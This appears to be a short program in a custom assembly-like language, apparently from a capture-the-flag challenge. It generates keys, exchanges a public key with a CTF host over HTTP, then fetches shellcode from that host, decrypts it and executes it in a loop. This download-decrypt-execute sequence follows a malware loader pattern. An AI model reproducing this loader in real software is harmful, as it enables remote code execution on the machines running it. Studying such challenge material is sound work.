genkeys
movr rdi rax
posthttp http://static1.midnighflag.fr:5000/pub
gethttp http://static1.midnighflag.fr:5000/pub
movr rdi rax
gensecret

readstdin
movr rcx rax
push rax
gethttp http://static1.midnighflag.fr:5000/shellcode/check
movr rdi rax
dec
movr rdi rax
execshellcode 1
mov rbx 1
cmp rax rbx
jne -10

